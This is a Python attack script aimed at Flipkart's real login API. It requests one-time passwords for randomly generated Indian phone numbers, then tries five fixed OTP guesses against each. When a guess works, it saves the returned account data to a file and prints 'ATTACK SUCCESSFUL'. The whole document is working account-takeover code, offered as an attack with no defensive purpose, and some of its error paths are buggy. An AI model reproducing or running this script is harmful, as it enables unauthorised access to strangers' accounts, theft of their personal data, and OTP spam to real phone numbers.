print("Starting Engine for Attack...")
import requests
import random
import json
import time
header = {"X-User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0 FKUA/website/42/website/Desktop"}
i = 1
while(i <= 30):
	unixtime = str(time.time()) 
	phnumber = random.randint(7021000000,7021999999)
	strnumber = str(phnumber)
	countrycode= "+91"
	fnumber = countrycode+strnumber
	url1 = 'https://2.rome.api.flipkart.com/api/7/user/otp/generate'
	myobj1 = '{"loginId": "'+fnumber+'"}'
	response1 = requests.post(url1, data = myobj1, headers=header)
	if response1.status_code != 200:
		print("We are being encountered by WAF")
	else:
		json_object = json.loads(response1.content)
		challenge = json_object['RESPONSE']['requestId']
		otp1 = 208155
		strotp1 = str(otp1)
		otp2 = 340123
		strotp2 = str(otp2)
		otp3 = 817114
		strotp3 = str(otp3)
		otp4 = 433298
		strotp4 = str(otp4)
		otp5 = 634947
		strotp5 = str(otp5)
		j = 1
		while(j <= 2):
			authurl = 'https://2.rome.api.flipkart.com/api/1/user/login/otp'
			authobj1 = '{"userId":"'+fnumber+'","requestId":"'+challenge+'","otp":"'+strotp1+'"}'
			authresponse1 = requests.post(authurl, data = authobj1, headers=header)
			if authresponse1.status_code == 200:
				extension = ".json"
				fname = strnumber + extension 
				open(fname, 'wb').write(authresponse1.content)
				print("ATTACK SUCCESSFUL - All data has been saved in "+strnumber+".json")
			else:
				print(strotp1 +" was not a correct OTP for "+strnumber + ". we are giving second shot for you...")
				authobj2 = '{"userId":"'+fnumber+'","requestId":"'+challenge+'","otp":"'+strotp2+'"}'
				authresponse2 = requests.post(authurl, data = authobj2, headers=header)
				if authresponse2.status_code == 200:
					extension = ".json"
					fname = strnumber + extension 
					open(fname, 'wb').write(authresponse2.content)
					print("ATTACK SUCCESSFUL - All data has been saved in "+strnumber+".json")
				else:
					print(strotp2 +" was not a correct OTP for "+strnumber + ". we are giving third shot for you...")
					authobj3 = '{"userId":"'+fnumber+'","requestId":"'+challenge+'","otp":"'+strotp3+'"}'
					authresponse3 = requests.post(authurl, data = authobj3, headers=header)
					if authresponse3.status_code == 200:
						extension = ".json"
						fname = strnumber + extension 
						open(fname, 'wb').write(authresponse3.content)
						print("ATTACK SUCCESSFUL - All data has been saved in "+strnumber+".json")
					else:
						print(strotp3 +" was not a correct OTP for "+strnumber + ". we are giving forth shot for you...")
						authobj4 = '{"userId":"'+fnumber+'","requestId":"'+challenge+'","otp":"'+strotp4+'"}'
						authresponse4 = requests.post(authurl, data = authobj4, headers=header)
						if authresponse4.status_code == 200:
							open(fname, 'wb').write(authresponse4.content)
							print("ATTACK SUCCESSFUL - All data has been saved in "+strnumber+".json")
						else:
							print(strotp4 +" was not a correct OTP for "+strnumber + ". we are giving fith shot for you...")
							authobj5 = '{"userId":"'+fnumber+'","requestId":"'+challenge+'","otp":"'+strotp5+'"}'
							authresponse5 = requests.post(authurl, data = authobj5, headers=header)
							if authresponse5.status_code == 200:
								open(fname, 'wb').write(authresponse5.content)
								print("ATTACK SUCCESSFUL - All data has been saved in "+strnumber+".json")
							else:
								print(strotp5 +" was not a correct OTP for "+strnumber + ". Sorry no luck. We may start one more round if attempts are available. Or we would try on next number.")
								
			j = j+1
	i = i+1
         			
         				
         			
         			
         			
         	
         
         
         
